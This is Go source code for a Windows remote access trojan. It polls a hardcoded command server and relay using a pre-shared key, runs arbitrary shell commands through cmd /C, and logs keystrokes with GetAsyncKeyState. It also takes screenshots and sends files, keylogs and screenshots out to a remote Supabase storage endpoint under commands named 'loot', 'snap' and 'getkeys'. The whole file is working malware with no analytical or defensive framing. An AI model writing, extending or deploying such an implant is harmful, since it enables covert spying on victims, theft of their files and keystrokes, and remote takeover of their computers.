package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime" // Required for OS/Arch info
	"strings"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
)

// --- CONFIGURATION ---
const (
	SUPABASE_URL = "https://prodlnwtjkomsstrufqr.functions.supabase.co"
	API_KEY      = "REPLACE_ME_API_KEY" // Injected by GitHub Action or set manually
)

var (
	currentWorkingDir string
	keyLogBuffer      strings.Builder
	lastKeyState      [256]bool
	user32            = syscall.NewLazyDLL("user32.dll")
	getAsyncState     = user32.NewProc("GetAsyncKeyState")
)

type AuthRequest struct {
	Type     string `json:"type"`
	TargetID string `json:"target_id"`
	APIKey   string `json:"key"` // Change "api_key" to "key"
}
type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
	TaskID    string `json:"task_id"`
	Command   string `json:"command"`
}

func init() {
	currentWorkingDir, _ = os.Getwd()
}

// Helper to get system specs for the dashboard
func getSystemInfo() (string, string) {
	return runtime.GOOS, runtime.GOARCH
}

func main() {
	h, _ := os.Hostname()
	targetID := strings.ToUpper(fmt.Sprintf("%s-%d", h, time.Now().Unix()%1000))

	fmt.Printf("[*] Agent Online: %s | OS: %s | Arch: %s\n", targetID, runtime.GOOS, runtime.GOARCH)

	// Initial check-in to register OS/Arch in your web dashboard
	sendHeartbeat(targetID)

	go startKeylogger()

	for {
		pollAndExecute(targetID)
		time.Sleep(5 * time.Second)
	}
}

// Updates the dashboard with Online status and system specs
func sendHeartbeat(targetID string) {
	osInfo, archInfo := getSystemInfo()
	payload := map[string]string{
		"target_id": targetID,
		"api_key":   API_KEY,
		"status":    "Online",
		"os_info":   osInfo,
		"arch":      archInfo,
	}
	jsonData, _ := json.Marshal(payload)

	url := fmt.Sprintf("%s/device-heartbeat", strings.TrimSuffix(SUPABASE_URL, "/"))
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 5 * time.Second}
	client.Do(req)
}

func uploadToStorage(fileName string, data []byte, targetID string) (string, error) {
	baseUrl := strings.TrimSuffix(SUPABASE_URL, "/")
	url := fmt.Sprintf("%s/functions/v1/storage-upload", baseUrl)

	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
	req.Header.Set("x-api-key", strings.TrimSpace(API_KEY))
	req.Header.Set("x-file-name", fileName)
	req.Header.Set("x-target-id", targetID)
	req.Header.Set("Content-Type", "image/png")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(body))
	}

	var result struct {
		OK  bool   `json:"ok"`
		URL string `json:"url"`
	}
	json.Unmarshal(body, &result)
	return result.URL, nil
}

func reportDiagnostic(fileType, url, targetID string) {
	payload := map[string]interface{}{
		"target_id": targetID,
		"type":      fileType,
		"file_url":  url,
	}
	jsonData, _ := json.Marshal(payload)

	urlEndpoint := fmt.Sprintf("%s/task-result", strings.TrimSuffix(SUPABASE_URL, "/"))
	hReq, _ := http.NewRequest("POST", urlEndpoint, bytes.NewBuffer(jsonData))
	hReq.Header.Set("x-api-key", API_KEY)
	hReq.Header.Set("Content-Type", "application/json")

	http.DefaultClient.Do(hReq)
}

func pollAndExecute(targetID string) {
	// 1. Send heartbeat with every poll
	sendHeartbeat(targetID)

	// 2. Dial the Brain (Switchboard)
	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 5*time.Second)
	if err != nil {
		return
	}

	psk := "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
	c.Write([]byte(psk))
	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID, APIKey: API_KEY})

	var buf bytes.Buffer
	io.Copy(&buf, c)
	c.Close()

	if buf.Len() == 0 {
		return
	}

	var res RoutingInfo
	json.Unmarshal(buf.Bytes(), &res)
	// 1. Check for empty command using Dot Notation

	// 2. If the Brain says "Go to Relay", we must fetch the REAL payload from the Relay
	if res.Command == "" && res.RelayAddr != "" {
		fmt.Printf("[*] Signal received. Fetching payload from Relay: %s\n", res.RelayAddr)

		rc, err := net.DialTimeout("tcp", res.RelayAddr, 5*time.Second)
		if err != nil {
			return
		}

		rc.Write([]byte(psk)) // Relay Handshake

		// This request goes through the Relay and hits the Brain
		// making the Brain think the Relay is the one asking.
		json.NewEncoder(rc).Encode(AuthRequest{
			Type:     "client_poll",
			TargetID: targetID,
			APIKey:   API_KEY,
		})

		var relayBuf bytes.Buffer
		io.Copy(&relayBuf, rc)
		rc.Close()

		// Now 'res' actually contains the command!
		json.Unmarshal(relayBuf.Bytes(), &res)
	}

	if res.Command == "" {
		return
	}
	taskID := res.TaskID
	rawCmd := res.Command

	fmt.Printf("[!] EXECUTING TASK: %s\n", rawCmd)

	// 3. Relay Pivot (Trigger Relay Logs)
	if res.RelayAddr != "" {
		fmt.Printf("[*] Routing through Relay: %s\n", res.RelayAddr)
		rc, err := net.DialTimeout("tcp", res.RelayAddr, 5*time.Second)
		if err == nil {
			rc.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE")) // Relay PSK
			rc.Close()
		}
	}
	var finalOutput string

	if strings.HasPrefix(rawCmd, "download ") {
		filePath := strings.TrimPrefix(rawCmd, "download ")
		data, err := os.ReadFile(filePath)
		if err != nil {
			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
		} else {
			finalOutput = "FILE_DATA:" + filepath.Base(filePath) + "|" + base64.StdEncoding.EncodeToString(data)
		}
	} else if rawCmd == "snap" {
		bounds := screenshot.GetDisplayBounds(0)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			finalOutput = "[!] Capture Error"
		} else {
			var buf bytes.Buffer
			png.Encode(&buf, img)
			fileName := fmt.Sprintf("snap_%d.png", time.Now().Unix())

			// Updated call with targetID
			fileUrl, err := uploadToStorage(fileName, buf.Bytes(), targetID)

			if err != nil {
				finalOutput = "[!] Upload Error: " + err.Error()
			} else {
				reportDiagnostic("image", fileUrl, targetID)
				finalOutput = "[+] Screenshot uploaded: " + fileUrl
			}
		}
	} else if rawCmd == "getkeys" {
		finalOutput = keyLogBuffer.String()
		keyLogBuffer.Reset()
		// Inside your execution gateway (if/else block) in pollAndExecute
	} else if strings.HasPrefix(rawCmd, "loot ") {
		// 1. Extract and clean the target path
		filePath := strings.TrimPrefix(rawCmd, "loot ")
		filePath = strings.Trim(filePath, "\"")

		// 2. Read the file into memory
		data, err := os.ReadFile(filePath)
		if err != nil {
			finalOutput = fmt.Sprintf("[!] Loot Error: %v", err)
		} else {
			// 3. Prepare a unique filename for the Storage bucket
			timestamp := time.Now().Unix()
			baseName := filepath.Base(filePath)
			saveName := fmt.Sprintf("loot_%d_%s", timestamp, baseName)

			// 4. Upload to Supabase Storage
			// Passing targetID ensures it maps correctly to the device in the Vault
			fileUrl, err := uploadToStorage(saveName, data, targetID)
			if err != nil {
				finalOutput = "[!] Upload Error: " + err.Error()
			} else {
				// 5. Register the file in the 'diagnostic_vault' table
				// We use 'text' or 'loot' as the type so the dashboard knows how to categorize it
				reportDiagnostic("text", fileUrl, targetID)
				finalOutput = fmt.Sprintf("[+] Loot successful: %s -> %s", baseName, fileUrl)
			}
		}
	} else {
		cmdObj := exec.Command("cmd", "/C", rawCmd)
		cmdObj.Dir = currentWorkingDir
		out, _ := cmdObj.CombinedOutput()
		finalOutput = string(out)
	}

	reportTaskResult(taskID, finalOutput)
}

func reportTaskResult(taskID string, output string) {
	payload := map[string]interface{}{
		"task_id": taskID,
		"status":  "Completed",
		"result":  output,
	}

	jsonData, _ := json.Marshal(payload)
	urlEndpoint := fmt.Sprintf("%s/task-result", strings.TrimSuffix(SUPABASE_URL, "/"))
	hReq, _ := http.NewRequest("POST", urlEndpoint, bytes.NewBuffer(jsonData))
	hReq.Header.Set("x-api-key", API_KEY)
	hReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(hReq)
	if err != nil {
		fmt.Printf("[!] Failed to clear task %s: %v\n", taskID, err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		fmt.Printf("[+] Task %s successfully cleared from queue.\n", taskID)
	} else {
		fmt.Printf("[!] SaaS Error (%d)\n", resp.StatusCode)
	}
}

func startKeylogger() {
	for {
		time.Sleep(10 * time.Millisecond)
		for i := 0; i < 256; i++ {
			ret, _, _ := getAsyncState.Call(uintptr(i))
			if (ret&0x8000) != 0 && !lastKeyState[i] {
				if i >= 32 && i <= 126 {
					keyLogBuffer.WriteByte(byte(i))
				}
			}
			lastKeyState[i] = (ret & 0x8000) != 0
		}
	}
}
